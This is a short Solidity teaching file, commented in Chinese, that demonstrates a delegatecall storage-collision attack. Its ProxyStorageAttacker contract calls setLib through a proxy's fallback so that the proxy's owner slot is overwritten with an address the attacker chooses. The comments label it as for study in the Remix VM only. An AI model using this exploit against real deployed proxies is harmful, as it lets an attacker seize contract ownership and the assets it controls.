// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * ⚠️ 仅供学习、请勿用于攻击真实合约。仅在 Remix VM 演示。
 *
 * delegatecall 存储冲突的"攻击"其实非常简单：
 * 直接通过代理触发 Lib.setLib(攻击者地址)，
 * 借 delegatecall 把代理的 slot 0（owner）覆盖成攻击者。
 *
 * 这里给一个便捷调用器，也可以直接用 low-level call 手工构造 calldata。
 */

interface ILibViaProxy {
    // 通过代理 fallback 走到 Lib.setLib
    function setLib(address _lib) external;
}

contract ProxyStorageAttacker {
    /**
     * 把 proxy 当作实现了 setLib 的合约调用（实际由 fallback delegatecall 到 Lib）。
     * 传入攻击者自己的地址，Lib.setLib 会把 proxy 的 slot 0 = owner 改成它。
     */
    function attack(address proxy, address newOwner) external {
        ILibViaProxy(proxy).setLib(newOwner);
    }
}
